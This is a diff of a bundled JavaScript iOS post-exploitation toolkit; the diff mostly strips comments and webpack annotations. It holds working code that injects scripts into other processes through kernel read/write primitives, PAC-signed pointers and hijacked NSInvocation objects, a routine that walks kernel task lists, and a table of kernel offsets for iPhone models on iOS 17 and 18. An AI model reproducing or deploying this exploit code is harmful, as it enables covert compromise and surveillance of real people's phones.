-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ InjectJS)
-/* harmony export */ });
-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
-/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/TaskRop/RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
-/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( InjectJS)
+ });
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
+ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/TaskRop/RemoteCall.js");
+ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( "./src/libs/Chain/Chain.js");
 
 
 
@@ -1521,7 +1492,7 @@ class InjectJS {
 		else {
 			console.log(TAG, `Start injecting JS script into existing task: ${this.#target.pid()}`);
 
-			 // Assume target is a RemoteCall object
+			 
 			this.task = this.#target;
 			if (!this.task.success()) {
 				console.log(TAG, "Unable to inject into existing task");
@@ -1543,36 +1514,36 @@ class InjectJS {
 		const mem = this.task.mem();
 		const krwCtx = this.task.krwCtx();
 
-		// Sign __invoking__ function address
+		
 		this.#invokingAddr = this.task.pac(this.#invokingAddr, 0);
-		//console.log(TAG, "Signed invoking: " + Utils.hex(this.#invokingAddr));
+		
 
 		this.task.writeStr(mem, "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore");
 		const lib = this.task.call(1000, "dlopen", mem, RTLD_LAZY);
-		//console.log(TAG, "lib: " + Utils.hex(lib));
+		
 
-		// Create a JSC context and get pointer to exceptionHandler NSBlock
+		
 		const jscontext = this.#callObjcRetain(this.#JSContextClass, "new");
-		//console.log(TAG, "Remote JSC: " + Utils.hex(jscontext));
+		
 
 		const exceptionHandler = this.task.read64(jscontext + 0x28n);
-		//console.log(TAG, "Exception handler: " + Utils.hex(exceptionHandler));
+		
 
-		// Register an "invoker()" JS function within our JSC context, having exceptionHandler block as native implementation.
-		// We replace exceptionHandler NSInvocation later in this code.
+		
+		
 		const invokerStr = this.#writeCFStr(mem, "invoker");
 		this.#callObjc(jscontext, "setObject:forKeyedSubscript:", exceptionHandler, invokerStr);
-		//console.log(TAG, "invokerStr: " + Utils.hex(invokerStr));
+		
 
-		// Retrieve JSValue of invoker inside JSC context dict
+		
 		const invoker = this.#callObjc(jscontext, "objectForKeyedSubscript:", invokerStr);
-		//console.log(TAG, "invoker: " + Utils.hex(invoker));
+		
 
-		// Get pointer of NSInvocation inside NSBlock
+		
 		const fjval = this.task.read64(invoker + 0x8n);
 		const storval = this.task.read64(fjval + 0x40n);
 		const invokerObj = this.task.read64(storval + 0x10n);
-		//console.log(TAG, "invokerObj: " + Utils.hex(invokerObj));
+		
 
 		this.task.writeStr(mem, "QQQQQQQQQQQQQQQ");
 		const lsignature = this.#callObjc(this.#NSMethodSignatureClass, "signatureWithObjCTypes:", mem);
@@ -1580,28 +1551,28 @@ class InjectJS {
 		this.task.writeStr(mem, "@QQQQQQQQQQQQQQ");
 		const osignature = this.#callObjc(this.#NSMethodSignatureClass, "signatureWithObjCTypes:", mem);
 
-		// This is an utility NSInvocation object we share with JS to allow objc call with retained return object
+		
 		const oinv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", osignature);
 
-		// This is the final NSInvocation object we use to call the actual target function
+		
 		const inv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature);
-		//console.log(TAG, "inv: " + Utils.hex(inv));
+		
 
-		// Create a new NSInvocation and replace the NSBlock one with this
+		
 		const jsinv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature);
-		//console.log(TAG, "jsinv: " + Utils.hex(jsinv));
+		
 
 		const callBuff = this.task.call(100, "calloc", 1, 0x4000);
-		const firstInvokingBuff = callBuff + 0x50n;	// callBuff[10]
-		const argsBuff = callBuff + 0x320n;			// callBuff[100]
-		const resultBuff = callBuff + 0x640n;		// callBuff[200]
+		const firstInvokingBuff = callBuff + 0x50n;	
+		const argsBuff = callBuff + 0x320n;			
+		const resultBuff = callBuff + 0x640n;		
 
-		//console.log(TAG, "callBuff: " + Utils.hex(callBuff));
-		//console.log(TAG, "firstInvokingBuff: " + Utils.hex(firstInvokingBuff));
-		//console.log(TAG, "argsBuff: " + Utils.hex(argsBuff));
-		//console.log(TAG, "resultBuff: " + Utils.hex(resultBuff));
+		
+		
+		
+		
 
-		// Share callBuff with JS
+		
 		this.task.writeStr(mem, "nativeCallBuff");
 		const jsctx = this.#callObjc(jscontext, "JSGlobalContextRef");
 		const nativeCallBuff = this.task.call(100, "JSObjectMakeArrayBufferWithBytesNoCopy", jsctx, callBuff, 0x4000);
@@ -1611,41 +1582,41 @@ class InjectJS {
 
 		let localCallBuff = new BigUint64Array(33);
 		
-		// Second (final) __invoking__ arguments
-		localCallBuff[0] = 0x41414141n;	// this should be overwritten at every function call
-		localCallBuff[1] = resultBuff; // Result buffer
-		localCallBuff[2] = argsBuff; // Arguments buffer
-		localCallBuff[3] = 0x120n; // args buff size. Do not touch!
+		
+		localCallBuff[0] = 0x41414141n;	
+		localCallBuff[1] = resultBuff; 
+		localCallBuff[2] = argsBuff; 
+		localCallBuff[3] = 0x120n; 
 
-		// First __invoking__ arguments
+		
 		localCallBuff[10] = this.#invokingAddr;
 		localCallBuff[11] = resultBuff;
 		localCallBuff[12] = callBuff;
 		localCallBuff[13] = 0xe0n;
 
-		// Some offsets we export to JS
+		
 		localCallBuff[20] = callBuff;
 		localCallBuff[21] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "dlsym"), 0 );
 		localCallBuff[22] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "memcpy"), 0 );
 		localCallBuff[23] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "malloc"), 0 );
 		localCallBuff[24] = oinv;
 		localCallBuff[25] = jsctx;
-		localCallBuff[26] =  true ? 1n : 0;	// we pass true if DEBUG is set
+		localCallBuff[26] =  true ? 1n : 0;	
 		localCallBuff[27] = 1n;
 		localCallBuff[28] = 0n;
 		localCallBuff[29] = 0n;
 		localCallBuff[30] = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].getKernelBase();
 		let desiredPacGadget = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].getPaciaGadget();
-		// retreiving correct modifier for 18.4 and above
+		
 		if (globalThis.xnuVersion.major == 24 && globalThis.xnuVersion.minor >= 4) {
 			desiredPacGadget = Native.pacia(Native.strip(desiredPacGadget),0n);
 		}
 		localCallBuff[31] = desiredPacGadget;
 		localCallBuff[32] = BigInt(agentPid);
 
-		//console.log(TAG, "dlsym: " + Utils.hex(localCallBuff[21]));
-		//console.log(TAG, "memcpy: " + Utils.hex(localCallBuff[22]));
-		//console.log(TAG, "malloc: " + Utils.hex(localCallBuff[23]));
+		
+		
+		
 
 		const nativeLocalBuff = Native.callSymbol("malloc", localCallBuff.byteLength);
 		Native.write(nativeLocalBuff, localCallBuff.buffer);
@@ -1657,54 +1628,54 @@ class InjectJS {
 		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x10n, 2);
 		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x18n, 3);
 
-		// This NSInvocation should in turn call the final NSInvocation we created before,
-		// but with fully controlled arguments
+		
+		
 		this.task.write64(mem, this.#invokingAddr);
 		this.#callObjc(jsinv, "setTarget:", inv);
 		this.#callObjc(jsinv, "setSelector:", this.#invokeUsingIMPSel);
 		this.#callObjc(jsinv, "setArgument:atIndex:", mem, 2);
 
-		// Replace NSInvocation
+		
 		this.task.write64(storval + 0x10n, jsinv);
 		this.task.write64(storval + 0x18n, 0n);
-		//console.log(TAG, "NSInvocation replaced");
+		
 
-		// Write loader.js in remote task
-		//const loaderJS = "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();";
+		
+		
 		console.log(TAG, "JS script length: " + this.#injectCode.length);
 		const scriptMem = this.task.call(100, "calloc", 1, this.#injectCode.length + 1);
 		const scriptStr = this.#writeCFStr(scriptMem, this.#injectCode);
 		this.task.call(100, "free", scriptMem);
-		//console.log(TAG, "scriptStr: " + Utils.hex(scriptStr));
-
-		// Check if we write ok
-		// console.log(TAG,"Check if we write ok" )
-		// const a = Native.callSymbol("malloc", this.#injectCode.length + 1);
-		// const len = this.#callObjc(scriptStr, "length");
-		// console.log(TAG, len);
-		// const b = this.#callObjc(scriptStr, "UTF8String");
-		// this.task.read(b, a, this.#injectCode.length + 1);
-		// const c = Native.readString(a, this.#injectCode.length);
-		// console.log(TAG, c);
 		
 
-		//const loaderStr = this.#writeCFStr(mem, "loader");
-		//this.#callObjc(jscontext, "setObject:forKeyedSubscript:", scriptStr, loaderStr);
-		//console.log(TAG, "loaderStr: " + Utils.hex(loaderStr));
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+
+		
+		
+		
 
 		console.log(TAG, "Starting JS script for target: " + this.#target);
 
-		//const evaluateStr = this.#writeCFStr(mem, "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();");
-		//const evaluateStr = this.#writeCFStr(mem, "invoker();");
-		//const evaluateStr = this.#writeCFStr(mem, "eval(loader);");
-		//const evaluateStr = this.#writeCFStr(mem, scriptStr);
+		
+		
+		
+		
 		this.#callObjcInBackground(jscontext, "evaluateScript:", scriptStr);
-		//this.#callObjcInBackground(jscontext, "evaluateScript:", scriptStr);
-		//this.#callObjc(jscontext, "evaluateScript:", evaluateStr);
+		
+		
 
-		// Read data from result
-		//const retVal = this.task.read64(resultBuff);
-		//console.log(TAG, "Result: " + retVal);
+		
+		
+		
 
 		console.log(TAG, "All done!");
 
@@ -1712,11 +1683,11 @@ class InjectJS {
 	}
 
 	#findInvoking() {
-		//console.log(TAG, "Find 'invoking()'...");
+		
 
 		let startAddr = Native.dlsym("_CF_forwarding_prep_0");
-		startAddr = startAddr & 0x7fffffffffn; //Chain.strip(startAddr);
-		//console.log(TAG, "startAddr: " + Utils.hex(startAddr));
+		startAddr = startAddr & 0x7fffffffffn; 
+		
 
 		if (!startAddr)
 			return 0;
@@ -1729,15 +1700,15 @@ class InjectJS {
 		const pattern = new Uint8Array([0x67, 0x1D, 0x40, 0xF9, 0x66, 0x19, 0x40, 0xF9, 0x65, 0x15, 0x40, 0xF9, 0x64, 0x11, 0x40, 0xF9]);
 		Native.write(Native.mem, pattern.buffer);
 		let foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
-		//console.log(TAG, "foundAddr: " + Utils.hex(foundAddr));
+		
 
 		if (!foundAddr) {
-			// special case for iOS 17.4-17.4.1
-			//console.log(TAG,`Didnt found invoking,trying to find it for special version`);
+			
+			
 			startAddr = Native.dlsym("CFCharacterSetIsCharacterMember");
 			startAddr = startAddr & 0x7fffffffffn;
 			foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
-			//console.log(TAG,`foundAddr:${Utils.hex(foundAddr)}`);
+			
 			if (!foundAddr)
 				return 0;
 		}
@@ -1791,19 +1762,17 @@ class InjectJS {
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/Chain/Chain.js":
-/*!*********************************!*\
-  !*** ./src/libs/Chain/Chain.js ***!
-  \*********************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/Chain/Chain.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ Chain)
-/* harmony export */ });
-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( Chain)
+ });
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
 
 
 const TAG = "CHAIN"
@@ -1995,30 +1964,28 @@ class Chain
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/Chain/Native.js":
-/*!**********************************!*\
-  !*** ./src/libs/Chain/Native.js ***!
-  \**********************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/Chain/Native.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ Native)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( Native)
+ });
 const RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;
 
 class Native {
 
-	// Preallocated memory chunk for general purpose stuff for public use
+	
 	static mem = 0n;
 	static memSize = 0x4000;
 
-	// Preallocated memory chunk for encoding/decoding of string arguments
+	
 	static #argMem = 0n;
 
-	// Pointer to next available memory for native argument
+	
 	static #argPtr = 0n;
 
 	static {
@@ -2107,8 +2074,8 @@ class Native {
 	}
 
 	static writeString(ptr, str) {
-		//const buff = this.stringToBytes(str, true);
-		//this.write(ptr, buff);
+		
+		
 		this.callSymbol("memcpy", ptr, str, str.length + 1);
 	}
 
@@ -2130,9 +2097,9 @@ class Native {
 
 	static pacia(address, modifier) {
 		address = Native.strip(address);
-		//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);
+		
 		let signedAddress = pacia(address, BigInt(modifier));
-		//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);
+		
 		return signedAddress;
 	}
 
@@ -2201,7 +2168,7 @@ class Native {
 	}
 
 	static #doNativeCall(func, name, x0, x1, x2, x3, x4, x5, x6, x7) {
-		// Initialize argPtr to point to general purpose memory chunk
+		
 		this.#argPtr = this.#argMem;
 		x0 = this.#toNative(x0);
 		x1 = this.#toNative(x1);
@@ -2212,7 +2179,7 @@ class Native {
 		x6 = this.#toNative(x6);
 		x7 = this.#toNative(x7);
 		let ret = func(name, x0, x1, x2, x3, x4, x5, x6, x7);
-		// Reset argPtr
+		
 		this.#argPtr = this.#argMem;
 		return this.#fromNative(ret);
 	}
@@ -2225,7 +2192,7 @@ class Native {
 	}
 
 	static #toNative(value) {
-		// Strings need to be manually written to native memory
+		
 		if (typeof value === 'string') {
 			let ptr = this.#argPtr;
 			this.writeString(ptr, value);
@@ -2251,25 +2218,23 @@ class Native {
 	}
 }
 
-// Register global Native class
+
 globalThis.Native = Native;
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/Chain/OffsetsStruct.js":
-/*!*****************************************!*\
-  !*** ./src/libs/Chain/OffsetsStruct.js ***!
-  \*****************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/Chain/OffsetsStruct.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ OffsetsStruct)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( OffsetsStruct)
+ });
 const OFFSET_KERNEL_BASE  = 0xfffffff007004000n
-//const OFFSET_KERNEL_TASK  = 0x925770n // iOS 17.5.1 - iPhone 13/13 pro max
-//const OFFSET_KERNEL_TASK 0x91d318 // iOS 17.4.1 - iPhone 13 pro max
+
+
 const OFFSET_KERNEL_TASK = 0x0n
 const OFFSET_TASK_MAP = 0x28n
 const OFFSET_TASK_NEXT = 0x30n
@@ -2277,7 +2242,7 @@ const OFFSET_TASK_PREV = 0x38n
 const OFFSET_TASK_THREADS = 0x58n
 const OFFSET_TASK_IPC_SPACE = 0x300n
 const OFFSET_TASK_PROC_RO = 0x3a0n
-const OFFSET_TASK_PROC_SIZE = 0x740n // iOS 17.5.1
+const OFFSET_TASK_PROC_SIZE = 0x740n 
 const OFFSET_TASK_EXC_GUARD = 0x5d4n
 
 const OFFSET_IPC_SPACE_TABLE = 0x20n
@@ -2367,21 +2332,19 @@ class OffsetsStruct
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/Driver/Driver.js":
-/*!***********************************!*\
-  !*** ./src/libs/Driver/Driver.js ***!
-  \***********************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/Driver/Driver.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ DriverPostExpl)
-/* harmony export */ });
-/* harmony import */ var _Offsets__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./Offsets */ "./src/libs/Driver/Offsets.js");
-/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( DriverPostExpl)
+ });
+ var _Offsets__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/Driver/Offsets.js");
+ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/Chain/Native.js");
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
 
 
 
@@ -2403,11 +2366,7 @@ class DriverPostExpl
 			console.log(TAG, `Offsets were not obtained, aborting`);
 			return false;
 		}
-		/*
-		let baseKernel = startSandworm();
-		if (baseKernel == -1)
-			return false;
-		*/
+		
 		this.#kernelBase = mpd_kernel_base();
 
 		return true;
@@ -2447,9 +2406,9 @@ class DriverPostExpl
 		let kernelTaskVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 		this.read(kernelTaskAddr, kernelTaskVal, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
 		kernelTaskVal = uread64(kernelTaskVal);
-		//console.log(TAG,`kernelTaskval:${kernelTaskVal}`);
+		
 		kernelTaskVal = BigInt(kernelTaskVal);
-		//console.log(TAG,`kernelTaskval:${Utils.hex(kernelTaskVal)}`);
+		
 		let ourPid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("getpid");
 		console.log(TAG, `Our pid:${ourPid}`);
 		let nextTask = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n;
@@ -2458,24 +2417,24 @@ class DriverPostExpl
 		else
 			this.read(kernelTaskVal + this.#offsets.prevTask, nextTask, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
 		nextTask = uread64(nextTask);
-		//console.log(TAG,`nextTask:${Utils.hex(nextTask)}`);
+		
 
 		while (nextTask != 0 && nextTask != kernelTaskVal) {
 			let procROAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 			this.read(nextTask + this.#offsets.procRO, procROAddr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
 			procROAddr = uread64(procROAddr);
-			//console.log(TAG,`procROAddr:${Utils.hex(procROAddr)}`);
+			
 			let procVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 			this.read(procROAddr, procVal, 8);
 			procVal = BigInt(uread64(procVal));
-			//console.log(TAG,`procVal:${Utils.hex(procVal)}`);
+			
 			if (procVal && this.strip(procVal) > 0xffffffd000000000n) {
 				let pid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 				this.read(procVal + this.#offsets.pid, pid, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
 				let buffRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(pid, 4);
 				let view = new DataView(buffRes);
 				pid = view.getUint32(0,true);
-				//console.log(TAG,`pid:${Utils.hex(pid)}`);
+				
 				if (pid == ourPid) {
 					console.log(TAG, `Found our pid`);
 					return nextTask;
@@ -2538,20 +2497,18 @@ class DriverPostExpl
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/Driver/Offsets.js":
-/*!************************************!*\
-  !*** ./src/libs/Driver/Offsets.js ***!
-  \************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/Driver/Offsets.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ Offsets)
-/* harmony export */ });
-/* harmony import */ var libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/OffsetsStruct */ "./src/libs/Chain/OffsetsStruct.js");
-/* harmony import */ var _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./OffsetsTable */ "./src/libs/Driver/OffsetsTable.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( Offsets)
+ });
+ var libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/Chain/OffsetsStruct.js");
+ var _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/Driver/OffsetsTable.js");
 
 
 
@@ -2582,7 +2539,7 @@ class Offsets
 
 		console.log(TAG, "deviceFamily: " + deviceFamily);
 
-		// Ugly hack to support 17.7, 17.7.1 and 17.7.2
+		
 		if (buildVer) {
 			if (buildVer == "21H16")
 				xnuMinor = 6.1;
@@ -2591,7 +2548,7 @@ class Offsets
 			else if (buildVer == "21H221")
 				xnuMinor = 6.3;
 		}
-		// Get offsets per device family
+		
 		let deviceOffsets = _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__.offsets[deviceFamily];
 		if (!deviceOffsets) {
 			console.log(TAG, `Unsupported machine: ${machine}`);
@@ -2604,13 +2561,13 @@ class Offsets
 		if (!foundFamilyOffsets)
 			return null;
 
-		// Adjustments per device model
+		
 		let modelOffsets = deviceOffsets[deviceModel];
 		let foundModelOffsets = null;
 		if (modelOffsets)
 			foundModelOffsets = this.#getOffsetsByVersion(modelOffsets, xnuMajor, xnuMinor);
 
-		// Merge family offsets and device offsets
+		
 		let foundOffsets = new libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__["default"]();
 		Object.assign(foundOffsets, foundFamilyOffsets);
 		if (foundModelOffsets)
@@ -2640,14 +2597,14 @@ class Offsets
 			return null;
 		}
 
-		//console.log(TAG, "Matching XNU major: " + xnuMajorOffsets);
+		
 		xnuMajorOffsets = offsets[xnuMajorOffsets];
 
 		let foundOffsets = {};
 		let xnuMinorOffsets = -1;
 		const sortedMinors = Object.keys(xnuMajorOffsets).sort();
 		for (let minor of sortedMinors) {
-			//console.log(TAG, `minor: ${minor}, xnuMinor: ${xnuMinor}`);
+			
 			if (minor > xnuMinor)
 				break;
 			if (xnuMinorOffsets < minor) {
@@ -2656,7 +2613,7 @@ class Offsets
 			}
 		}
 
-		//console.log(TAG, "Matching XNU minor: " + xnuMinorOffsets);
+		
 
 		return foundOffsets;
 	}
@@ -2688,23 +2645,21 @@ class Offsets
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/Driver/OffsetsTable.js":
-/*!*****************************************!*\
-  !*** ./src/libs/Driver/OffsetsTable.js ***!
-  \*****************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/Driver/OffsetsTable.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   offsets: () => (/* binding */ offsets)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   offsets: () => ( offsets)
+ });
 const offsets = {
-	// iPhone XS
-	// iPhone XS Max
-	// iPhone XS Max Global
-	// iPhone XR
+	
+	
+	
+	
 	"iPhone11": {
 		"*": {
 			23: {
@@ -2859,10 +2814,10 @@ const offsets = {
 		}
 	},
 
-	// iPhone 11
-	// iPhone 11 Pro
-	// iPhone 11 Pro Max
-	// iPhone SE 2
+	
+	
+	
+	
 	"iPhone12": {
 		"*": {
 			23: {
@@ -3092,10 +3047,10 @@ const offsets = {
 		}
 	},
 
-	// iPhone 12
-	// iPhone 12 Mini
-	// iPhone 12 Pro
-	// iPhone 12 Pro Max
+	
+	
+	
+	
 	"iPhone13": {
 		"*": {
 			23: {
@@ -3211,13 +3166,13 @@ const offsets = {
 		}
 	},
 
-	// iPhone 13
-	// iPhone 13 Mini
-	// iPhone 13 Pro
-	// iPhone 13 Pro Max
-	// iPhone SE 3
-	// iPhone 14
-	// iPhone 14 Plus
+	
+	
+	
+	
+	
+	
+	
 	"iPhone14": {
 		"*": {
 			23: {
@@ -3470,10 +3425,10 @@ const offsets = {
 		}
 	},
 
-	// iPhone 14 Pro
-	// iPhone 14 Pro Max
-	// iPhone 15
-	// iPhone 15 Plus
+	
+	
+	
+	
 	"iPhone15": {
 		"*": {
 			23: {
@@ -3681,8 +3636,8 @@ const offsets = {
 		}
 	},
 
-	// iPhone 15 Pro
-	// iPhone 15 Pro Max
+	
+	
 	"iPhone16": {
 		"*": {
 			23: {
@@ -3795,10 +3750,10 @@ const offsets = {
 			}
 		}
 	},
-	// iPhone 16
-	// iPhone 16 plus
-	// iPhone 16 pro
-	// iPhone 16 pro max
+	
+	
+	
+	
 	"iPhone17": {
 		"*": {
 			24: {
@@ -3938,18 +3893,16 @@ const offsets = {
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/JSUtils/FileUtils.js":
-/*!***************************************!*\
-  !*** ./src/libs/JSUtils/FileUtils.js ***!
-  \***************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/JSUtils/FileUtils.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ FileUtils)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( FileUtils)
+ });
 
 
 const TAG = "FILE-UTILS";
@@ -4138,7 +4091,7 @@ class FileUtils {
 		return !Native.callSymbol("rmdir", path);
 	}
 
-	static exists(path, permission=0/*F_OK*/) {
+	static exists(path, permission=0) {
 		return !Native.callSymbol("access", path, permission);
 	}
 
@@ -4201,7 +4154,7 @@ class FileUtils {
 			return false;
 		}
 
-		// For some reason file mode is not applied on open()
+		
 		Native.callSymbol("fchmod", fd, 0o644);
 
 		let offs = 0;
@@ -4232,18 +4185,16 @@ class FileUtils {
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/JSUtils/Utils.js":
-/*!***********************************!*\
-  !*** ./src/libs/JSUtils/Utils.js ***!
-  \***********************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/JSUtils/Utils.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ Utils)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( Utils)
+ });
 
 
 const TAG = "UTILS";
@@ -4353,8 +4304,8 @@ class Utils {
         const chunkSize = 8;
 
         for (let i = 0; i < buffer.byteLength; i += chunkSize) {
-			// Read the chunk as a BigInt
-			const chunk = view.getBigUint64(i, true); // Little-endian
+			
+			const chunk = view.getBigUint64(i, true); 
 
             console.log(TAG, `0x${Utils.hex(i)}: ${Utils.hex(chunk)}`);
         }
@@ -4376,23 +4327,21 @@ class Utils {
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/Exception.js":
-/*!***************************************!*\
-  !*** ./src/libs/TaskRop/Exception.js ***!
-  \***************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/Exception.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ Exception)
-/* harmony export */ });
-/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
